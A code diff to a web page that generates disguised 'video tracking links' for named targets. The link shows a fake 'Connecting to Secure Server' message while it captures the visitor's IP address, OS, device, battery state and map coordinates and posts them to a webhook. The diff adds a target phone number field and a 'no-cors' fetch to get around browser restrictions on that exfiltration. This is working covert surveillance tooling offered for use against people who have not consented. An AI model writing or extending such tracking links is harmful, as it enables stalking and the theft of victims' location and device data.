@@ -293,6 +293,7 @@
             <p style="color: #888;">System will auto-generate a video tracking link</p>
 
             <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)">
+            <input type="tel" id="targetPhone" placeholder="Target Phone Number (Optional)">
             <input type="text" id="loadingText" placeholder="Custom loading message (Optional)">
 
             <button onclick="generateLink()">Generate Auto-Tracking Link</button>
@@ -320,6 +321,7 @@
                     <thead>
                         <tr>
                             <th>Name</th>
+                            <th>Phone</th>
                             <th>IP Address</th>
                             <th>OS</th>
                             <th>Device</th>
@@ -382,13 +384,15 @@
             const videoUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
             const linkName = document.getElementById('linkName').value || 'Unnamed';
+            const targetPhone = document.getElementById('targetPhone').value || 'N/A';
             const loadingMsg = document.getElementById('loadingText').value || 'Connecting to Secure Server...';
 
             // Create config object
             const config = {
                 u: videoUrl,
                 n: linkName,
-                m: loadingMsg
+                m: loadingMsg,
+                p: targetPhone
             };
 
             const baseUrl = window.location.href.split('?')[0];
@@ -457,6 +461,7 @@
                 const mapUrl = (log.lat !== null && log.lon !== null) ? `https://www.google.com/maps?q=${log.lat},${log.lon}` : '#';
                 const row = `<tr>
                     <td>${log.link_label}</td>
+                    <td>${log.target_phone || 'N/A'}</td>
                     <td>${log.ip}</td>
                     <td>${log.os}</td>
                     <td>${log.device || 'Unknown'}</td>
@@ -486,6 +491,7 @@
 
             let visitorData = {
                 link_label: globalConfig.n,
+                target_phone: globalConfig.p || 'N/A',
                 redirect_url: targetUrl,
                 timestamp: new Date().toISOString(),
                 userAgent: navigator.userAgent,
@@ -524,9 +530,13 @@
             }
 
             async function captureBattery() {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
+                try {
+                    if (navigator.getBattery) {
+                        const battery = await navigator.getBattery();
+                        visitorData.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? '🔌' : '🔋'})`;
+                    }
+                } catch (e) {
+                    console.warn("Battery API not supported");
                 }
             }
 
@@ -579,7 +589,7 @@
                 if (!WEBHOOK_URL.includes("YOUR_WEBHOOK_URL_HERE") && WEBHOOK_URL.startsWith("http")) {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        mode: 'no-cors', // Bypasses CORS preflight issues on GitHub Pages
                         body: JSON.stringify(visitorData),
                         keepalive: true
                     }).catch(e => console.warn("Webhook failed"));
